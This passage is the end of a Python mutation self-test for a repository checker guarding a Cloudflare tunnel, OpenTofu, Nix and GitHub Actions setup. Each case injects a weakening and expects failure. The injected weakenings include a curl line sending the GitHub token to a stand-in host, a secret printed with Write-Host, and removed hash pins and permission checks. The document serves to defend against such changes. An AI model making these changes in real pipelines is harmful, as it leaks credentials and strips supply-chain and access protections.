        expect_red(replace_text(adapter, f"\n{gate} = False\n", f"\n{gate} = True\n"))
        expect_red(replace_text(adapter, f"\n{gate} = False\n", f"\n{gate} = bool(0)\n"))
        expect_red(replace_text(adapter, f"    require({gate}, ", f"    require(True or {gate}, "))
    # The readiness grant opens only inspect, as one literal True that still guards the entry's first line.
    expect_red(replace_text(adapter, "\nROOT_INSPECT_SOURCE_ACTIVE = True\n", "\nROOT_INSPECT_SOURCE_ACTIVE = bool(1)\n"))
    expect_red(replace_text(adapter, "\nROOT_INSPECT_SOURCE_ACTIVE = True\n",
                            "\nROOT_INSPECT_SOURCE_ACTIVE = True\nROOT_INSPECT_SOURCE_ACTIVE = True\n"))
    expect_red(replace_text(adapter, "    require(ROOT_INSPECT_SOURCE_ACTIVE, ", "    require(True or ROOT_INSPECT_SOURCE_ACTIVE, "))
    expect_red(replace_text(adapter, '    require(ROOT_PLAN_SOURCE_ACTIVE, "rent-root backend-only plan is source-hard-inactive")\n'
                                     '    progress["stage"] = "contracts"\n    contracts = validate_contracts(root)\n',
                            '    progress["stage"] = "contracts"\n    contracts = validate_contracts(root)\n'
                            '    require(ROOT_PLAN_SOURCE_ACTIVE, "rent-root backend-only plan is source-hard-inactive")\n'))
    expect_red(replace_text(adapter, '"GIT_USERNAME": ROOT_STATE_GIT_USERNAME,', ""))
    expect_red(replace_text(adapter, '\nROOT_STATE_GIT_USERNAME = "x-access-token"\n', '\nROOT_STATE_GIT_USERNAME = ""\n'))
    expect_red(replace_text(adapter, "clean_env(tools, {\"HOME\": str(home), \"GIT_USERNAME\"",
                            "clean_env(tools, {\"GIT_PASSWORD\": token, \"HOME\": str(home), \"GIT_USERNAME\""))
    expect_red(replace_text(adapter, "ROOT_LEGACY_S3_CONFIG = \"\"\"terraform {\n",
                            "ROOT_LEGACY_S3_CONFIG = \"\"\"terraform {\n  backend \"s3\" {\n  }\n"))
    expect_red(replace_text(rent, "    plan {\n      enforced = true\n    }\n", "    plan {\n      enforced = false\n    }\n"))
    expect_red(replace_text(rent, "    state {\n      enforced = true\n    }\n", ""))
    expect_red(replace_text(rent, 'output "credentials" {\n  sensitive = true\n', 'output "credentials" {\n'))
    expect_red(replace_text(rent, "  duration   = var.service_token_duration\n", '  duration   = "1h"\n'))
    expect_red(replace_text(rent, 'variable "service_token_duration" {\n  type = string\n}\n',
                            'variable "service_token_duration" {\n  type    = string\n  default = "1h"\n}\n'))
    expect_red(replace_text(".github/workflows/check.yml", '"$tool/tofu" -chdir="$rent" validate -no-color\n', ""))
    # A second, fixed lifetime elsewhere is refused; harmless comments on and around the one assignment are not.
    expect_red(replace_text(rent, '\ndata "cloudflare_zero_trust_tunnel_cloudflared_token" "rent" {',
                            '\nresource "cloudflare_zero_trust_access_service_token" "spare" {\n  account_id = var.account_id\n'
                            '  name       = "spare"\n  duration   = "1h"\n}\n\ndata "cloudflare_zero_trust_tunnel_cloudflared_token" "rent" {'))
    declared = (ROOT / rent).read_text(encoding="utf-8")
    commented = ('# backend "s3" is not another backend\n// duration = "1h" is only a comment\n'
                 + declared.replace("  duration   = var.service_token_duration\n",
                                    '  /*\n  duration = "1h"\n  */\n  duration   = var.service_token_duration # bound at deployment\n'))
    assert '  /*\n  duration = "1h"\n  */\n' in commented, "rent fixture anchor missing"
    repository.check_rent_config(commented)
    expect_red(restore("providers/dev-rent-access-probe/.terraform.lock.hcl", "\n"))
    expect_red(replace_text("flake.nix", 'pkgs.cloudflared.version == "2026.6.1"', 'pkgs.cloudflared.version != ""'))
    expect_red(replace_text("flake.nix", "[ p.cloudflare_cloudflare ]", "[ p.cloudflare_cloudflare p.hashicorp_random ]"))
    expect_red(replace_text("flake.nix", 'tofu = "${opentofu}/bin/tofu";', 'tofu = "/usr/bin/tofu";'))
    # GitHub-ref state transport: the pinned upstream v0.1.12 binary, in the closure, executed by its own build.
    expect_red(replace_text("flake.nix", "/download/v0.1.12/terraform-backend-git", "/download/v0.1.11/terraform-backend-git"))
    expect_red(replace_text("flake.nix", '"sha256-LumYYi0ryF7WaaGuZ6k+DNi564hn/IOda9bw9iLrDYA="', "lib.fakeHash"))
    expect_red(replace_text("flake.nix", " cloudflared opentofu terraform-backend-git ];", " cloudflared opentofu ];"))
    expect_red(replace_text("flake.nix", 'terraform_backend_git = "${terraform-backend-git}/bin/terraform-backend-git";',
                            'terraform_backend_git = "/usr/bin/terraform-backend-git";'))
    expect_red(replace_text("flake.nix", "          grep -qF -- --address backend.help\n", ""))
    expect_red(replace_text("flake.nix", "grep -qF -- --address backend.help", "true"))
    expect_red(replace_text("flake.nix", '"$target" --help >backend.help 2>&1 || true', "true >backend.help"))
    expect_red(replace_text(check, "HTTPS_PROXY=http://127.0.0.1:9 HTTP_PROXY=http://127.0.0.1:9 ", ""))
    expect_red(replace_text(check, 'grep -qxF "$curl" "$RUNNER_TEMP/provided.list"', "true"))
    expect_red(replace_text("flake.nix", 'curl = "${pkgs.curl}/bin/curl";', 'curl = "/usr/bin/curl";'))
    expect_red(replace_text("flake.nix", "openssh curl ]", "openssh ]"))
    expect_red(replace_text(check, 'grep -qF "cloudflared version 2026.6.1 "', 'grep -qF "cloudflared version"'))
    expect_red(replace_text("README.md", "dev-projection/RENT_CLOUDFLARE_ZONE_ID", "dev-projection/REMOVED"))

    # placement-gate (windows #14): each job binds the actual outputs; the entrance and the receiver keep values private.
    for marker in (
        'echo "cb6fec76e23cb4ac56771ac38472b0fe1ba79a849bf2200aeda7c9467a045b7b  $RUNNER_TEMP/placement/sops.exe" | sha256sum -c -',
        "$required = 'scope', 'build', 'windows', 'rent / build-test-publish', 'publish'",
        "$ref.object.type -cne 'commit' -or $ref.object.sha -cne $source",
        "if ('sha256:' + (Sha (Join-Path $dir $asset.name)) -cne $asset.digest)",
        "$n.Name -cin @('ReadRentAccessInput', 'Get-RentAccessProblem')",
        "$placed.verdict.sha256 -cne $values.client_slot_sha256",
        "manifests/sha-$WINDOWS_SOURCE",
        '"$entry" --root "$data" rent-client',
    ):
        expect_red(replace_text(check, marker, "true"))
    expect_red(replace_text(check, "    needs: [toolchain, placement-artifact, placement-author, placement-windows]\n",
                            "    needs: [placement-author]\n"))
    expect_red(replace_text(check, "    runs-on: windows-latest\n    timeout-minutes: 20\n", "    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n"))
    expect_red(replace_text(check, "          GH_TOKEN: ${{ github.token }}\n        run: |\n          $ErrorActionPreference",
                            "          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          $ErrorActionPreference"))
    expect_red(replace_text(check, "          token=\"$(curl -fsS 'https://ghcr.io/token",
                            "          curl -fsSL -H \"Authorization: Bearer $GH_TOKEN\" https://example.invalid\n"
                            "          token=\"$(curl -fsS 'https://ghcr.io/token"))
    expect_red(replace_text("flake.nix", '"sha256-y2/sduI8tKxWdxrDhHKw/hunmoSb8iAK7afJRnoEW3s="', "lib.fakeHash"))
    expect_red(replace_text("flake.nix", 'assert pkgs.sops.version == "3.13.2"; ', ""))
    receiver = "adapters/rent-receive.sh"
    expect_red(replace_text(receiver, "echo rent-receive: placed", 'echo "rent-receive: placed"'))
    expect_red(replace_text(receiver, "chmod 600 $temp\n", ""))
    expect_red(replace_text(receiver, "[ ! -L $slot ] || fail the slot is a link\n", ""))
    expect_red(replace_text(receiver, "[ ! -e $slot ] || [ $(stat -c %u:%g:%a $slot) = 0:0:600 ] || fail the slot is not the owned 0:0 600 token\n", ""))
    expect_red(replace_text(receiver, "if [ -e $slot ] && cmp -s $temp $slot; then", "if false; then"))
    expect_red(replace_text(receiver, "safe $dir || fail the slot directory is not a root-owned directory only its owner can write\n", ""))
    expect_red(replace_text(receiver, "safe $state || fail the state volume is not a root-owned directory only its owner can write\n", ""))
    expect_red(replace_text(receiver, "& 022 ))", "& 0 ))"))
    expect_red(replace_text(receiver, "[ $(stat -c %u $1) = 0 ] && ", ""))
    expect_red(replace_text(check, "'chown 1000:0 /s|chown 0:0 /s'; do", "; do"))
    expect_red(replace_text("adapters/place.ps1", "if ($count -gt $Limit + 2) {", "if ($false) {"))
    expect_red(replace_text("adapters/place.ps1", "Decrypt 'RENT_TUNNEL_TOKEN' 4096", "Decrypt 'RENT_TUNNEL_TOKEN' 1048576"))
    expect_red(replace_text("adapters/place.ps1", "$null = $writer.StandardOutput.BaseStream.CopyToAsync([IO.Stream]::Null)",
                            "$null = $writer.StandardOutput.ReadToEndAsync()"))
    expect_red(replace_text(check, 'test "$(place)" = "rent-receive: unchanged"', 'test "$(place)" = "rent-receive: placed"'))
    expect_red(replace_text(check, "for drift in 'chmod 644 /s/cloudflared/token' 'chown 1000:1000 /s/cloudflared/token'; do",
                            "for drift in; do"))
    entrance = "adapters/place.ps1"
    expect_red(replace_text(entrance, "exit $code\n", "Write-Host $payload\nexit $code\n"))
    expect_red(replace_text(entrance, "-Mode RentAccess'", "-Mode RentSsh'"))
    expect_red(replace_text(entrance, "@{ SOPS_AGE_KEY_FILE = $Identity }", "@{ SOPS_AGE_KEY = $Identity }"))
    expect_red(replace_text(entrance, "        if ([Console]::InputEncoding.GetPreamble().Length) { Refuse 'the console input encoding would prefix the value' }\n", ""))
    expect_red(lambda root: (root / "adapters/receive.sh").write_text("exit 0\n"))
    expect_red(replace_text("README.md", "placement-gate", "placement gate"))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"distribution_source":"', '"distribution_source":"main'))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"root_output_projection",', ""))
    expect_red(mutate_plane("dev.rent-root", lambda row: row["required_variables"][-1].update({"type": "age_recipient_list"})))
    expect_red(mutate_plane("dev.rent-client", lambda row: row.update({"github_environment": "dev-rent-tunnel"})))

    def invalid_client_ciphertext(root: Path) -> None:
        (root / "ciphertexts").mkdir(exist_ok=True)
        (root / "ciphertexts/dev-rent-client.sops.yaml").write_text("RENT_ACCESS_CLIENT_ID: plain\n")

    expect_red(invalid_client_ciphertext)
    print("repository checker self-test: PASS")


if __name__ == "__main__":
    main()
